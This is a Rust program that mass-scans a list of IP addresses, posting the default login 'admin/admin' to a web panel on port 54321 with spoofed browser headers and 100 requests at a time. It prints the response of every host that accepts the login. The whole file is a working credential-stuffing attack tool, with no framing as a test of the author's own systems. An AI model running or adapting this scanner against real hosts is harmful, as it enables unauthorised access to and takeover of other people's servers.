use std::fs::File;
use std::io::{BufRead, BufReader};
use std::time::Duration;
use futures::{stream::iter, StreamExt};
use reqwest::Client;
use tokio::time::timeout;
use reqwest::header;

fn read_file() -> Vec<String> {
    let file_path = "ips.txt";
    let file = File::open(file_path).unwrap();
    let reader = BufReader::new(file);
    reader.lines()
        .map(|line| line.unwrap_or_default())
        .collect()
}

async fn test_one_ip(ip: String) -> Result<bool, Box<dyn std::error::Error>> {
    let mut headers = header::HeaderMap::new();
    headers.insert("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0".parse().unwrap());
    headers.insert("Accept", "application/json, text/plain, */*".parse().unwrap());
    headers.insert("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2".parse().unwrap());
    headers.insert("Accept-Encoding", "gzip, deflate".parse().unwrap());
    headers.insert("Referer", "http://162.250.99.7:54321/".parse().unwrap());
    headers.insert("X-Requested-With", "XMLHttpRequest".parse().unwrap());
    headers.insert("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8".parse().unwrap());
    headers.insert("Connection", "keep-alive".parse().unwrap());
    headers.insert("Priority", "u=0".parse().unwrap());

    let url = "http://".to_string() + ip.as_str() + ":54321/login";
//   println!("{}",  url);
    let client = Client::new();
    let request = client.post(url).body("username=admin&password=admin").headers(headers);

    let response = timeout(Duration::from_secs(3), request.send()).await??;
    if response.status().is_success() {
        println!("{}: 请求成功", ip);
        println!("{}: {}", ip, response.text().await?);
        return Ok(true);
    } else {
        eprintln!("{}: 请求失败", ip);
        return Ok(false);
    }
}

#[tokio::main]
async fn main() {
    let ips = read_file();
    iter(ips)
        .for_each_concurrent(Some(100), |ip| async move {
            match test_one_ip(ip.clone()).await {
                Ok(t) => {
                    if t {
                        println!("ip: {} 成功", ip.clone());
                    }
                },
                Err(_) => return,
            };
        }).await;
}